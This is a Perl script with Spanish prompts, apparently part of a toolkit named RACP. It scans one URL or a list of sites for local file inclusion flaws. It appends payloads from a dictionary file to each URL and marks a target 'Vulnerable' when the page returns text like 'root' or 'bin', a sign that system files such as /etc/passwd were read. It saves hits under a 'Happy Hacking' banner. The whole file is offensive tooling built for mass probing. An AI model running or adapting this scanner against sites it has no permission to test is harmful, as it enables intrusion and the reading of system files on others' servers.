# By Rodrigo.
# Cheking lfi Beta V0.2
# Actualizado el 24/9/2015 
# 9:58 a.m
use LWP::Simple;
print "\n";
print "[A] Default.\n";
print "[B] Usar diccionario de paginas para verificar LFI. \n";
$respo = <STDIN>;
chomp($respo);
print "\n\n";
if ( $respo eq 'A' ){  


print "[!]Example : www.target.com/php.id= \n\n";
print "Introduce tu URL \n";
$patra = <STDIN>;
chomp($patra);
if ($patra !~ /^http:/){
	$patra = 'http://' . $patra;
}
print "\n\n";
$lfidicc = 'mhe/dicclfi.txt';

open ( EXPLOIT , "<$lfidicc");
while (@payload = <EXPLOIT>){
	chomp(@payload);



foreach $payasa(@payload){

	$newurl = $patra.$payasa;

	$pagina_codigo = LWP::Simple::get($newurl);

if ( $pagina_codigo =~ /root/ ||
	 $pagina_codigo =~ /bin/  ){
	print "[+] Vulnerable -> $newurl\n\n";

}
else {
	print "[-] No vulnerable -> $newurl\n\n";
}

}
close(LFI);
}
} 
elsif ( $respo eq 'B'){ 
print "[!] Tu puedes agregar las paginas en el siguiente archivo : \n";
print "[*] /RACP-master/tak/paginaslfi.txt\n\n";
sleep(6);
print "[!] Las paginas vulnerables se guardaran en : \n";
print "[*] /RACP-master/output/outlfi.txt\n\n";
sleep(6);
$outp = 'output/outlfi.txt';
$targ = 'tak/paginaslfi.txt';
open ( TARGETS , "<$targ");
while ( @ob = <TARGETS> ){ 
	chomp(@ob);
print "\n\n";
$lfidicc = 'mhe/dicclfi.txt';

open ( EXPLOIT , "<$lfidicc");
while (@payload = <EXPLOIT>){
	chomp(@payload);


foreach $tars(@ob){  
if ($tars !~ /^http:/){
	$tars = 'http://' . $tars;
}
foreach $payasa(@payload){

	$newurl = $tars.$payasa;

	$pagina_codigo = LWP::Simple::get($newurl);

if ( $pagina_codigo =~ /root/ ||
	 $pagina_codigo =~ /bin/  ){
	print "[+] Vulnerable -> $newurl\n\n";

open ( SAV , ">>$outp");
print SAV "\n\n";
print SAV " RACP | Happy Hacking :D !\n";
print SAV "===================================\n";
print SAV "===================================\n\n";
print SAV "$newurl\n";
close SAV;
}
else {
	print "[-] No vulnerable -> $newurl\n\n";
}
} 
} 
close(TARGETS);
} 
close(EXPLOIT)
}
}

